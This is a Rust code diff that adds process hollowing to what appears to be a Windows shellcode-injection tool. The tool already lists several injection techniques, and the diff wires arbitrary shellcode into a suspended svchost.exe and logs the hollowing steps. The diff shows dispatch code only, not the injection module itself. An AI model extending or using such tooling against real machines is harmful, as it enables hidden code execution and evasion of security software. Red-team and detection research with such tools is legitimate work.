@@ -4,6 +4,7 @@ mod common;
 pub mod crt;
 pub mod earlybird;
 pub mod hijack;
+pub mod hollow;
 pub mod section;
 pub mod stomp;
 pub mod wrappers;
@@ -21,6 +22,7 @@ pub enum InjectionTechnique {
     SectionMapping,
     Callback,
     ModuleStomp,
+    ProcessHollow,
 }
 
 impl InjectionTechnique {
@@ -38,6 +40,9 @@ impl InjectionTechnique {
             }
             "callback" | "enumwindows" | "timerqueue" | "threadpool" => Some(Self::Callback),
             "stomp" | "modulestomp" | "dllstomp" => Some(Self::ModuleStomp),
+            "hollowing" | "hollow" | "processhollowing" | "process_hollowing" => {
+                Some(Self::ProcessHollow)
+            }
             _ => None,
         }
     }
@@ -51,6 +56,7 @@ impl InjectionTechnique {
             Self::SectionMapping => "Section Map",
             Self::Callback => "Callback",
             Self::ModuleStomp => "Module Overwrite",
+            Self::ProcessHollow => "Process Hollowing",
         }
     }
 }
@@ -93,10 +99,13 @@ pub fn dry_run(pid: u32, technique: &str, log: &LogSink) {
                 log.detail("  Load module → parse PE → protect → overwrite .text → restore");
                 log.detail(format!("  Target module: {}", stomp::victim_dll()));
             }
+            InjectionTechnique::ProcessHollow => {
+                log.detail("  Create suspended → query PEB → unmap → alloc → write PE → set context → resume");
+            }
         }
     } else {
         log.error(format!("  Unknown technique: {}", technique));
-        log.info("  Known: createremote, apc, hijack, earlybird, section, callback, stomp");
+        log.info("  Known: createremote, apc, hijack, earlybird, section, callback, stomp, hollowing");
     }
 }
 
@@ -111,6 +120,7 @@ pub fn print_info(log: &LogSink) {
     log.info("  5. Section Map      — Shared memory mapping");
     log.info("  6. Callback         — Window enumeration callback");
     log.info("  7. Module Overwrite — Signed module .text replacement");
+    log.info("  8. Process Hollow   — Suspended process image replacement");
     log.info("");
 }
 
@@ -129,7 +139,10 @@ pub fn live_inject(
     }
     let skip_pid = matches!(
         technique,
-        InjectionTechnique::EarlyBird | InjectionTechnique::Callback | InjectionTechnique::ModuleStomp
+        InjectionTechnique::EarlyBird
+            | InjectionTechnique::Callback
+            | InjectionTechnique::ModuleStomp
+            | InjectionTechnique::ProcessHollow
     );
     if !skip_pid {
         crate::safety::validate_target(pid)
@@ -145,6 +158,9 @@ pub fn live_inject(
         InjectionTechnique::SectionMapping => section::live_inject(pid, shellcode, log),
         InjectionTechnique::Callback => callback::live_inject(shellcode, log),
         InjectionTechnique::ModuleStomp => stomp::live_inject(shellcode, log),
+        InjectionTechnique::ProcessHollow => {
+            hollow::live_inject(shellcode, "C:\\Windows\\System32\\svchost.exe", log)
+        }
     }
 }
 
@@ -171,7 +187,7 @@ pub fn run_live_injection(pid: u32, technique_name: &str, payload_path: &str, lo
         Some(t) => t,
         None => {
             log.error(format!("ERROR: unknown technique '{}'", technique_name));
-            log.info("Known: createremote, apc, hijack, earlybird, section, callback, stomp");
+            log.info("Known: createremote, apc, hijack, earlybird, section, callback, stomp, hollowing");
             return;
         }
     };
@@ -184,7 +200,10 @@ pub fn run_live_injection(pid: u32, technique_name: &str, payload_path: &str, lo
     ));
     let no_pid = matches!(
         technique,
-        InjectionTechnique::EarlyBird | InjectionTechnique::Callback | InjectionTechnique::ModuleStomp
+        InjectionTechnique::EarlyBird
+            | InjectionTechnique::Callback
+            | InjectionTechnique::ModuleStomp
+            | InjectionTechnique::ProcessHollow
     );
     if no_pid {
         log.info("  Mode: local (PID not required)");
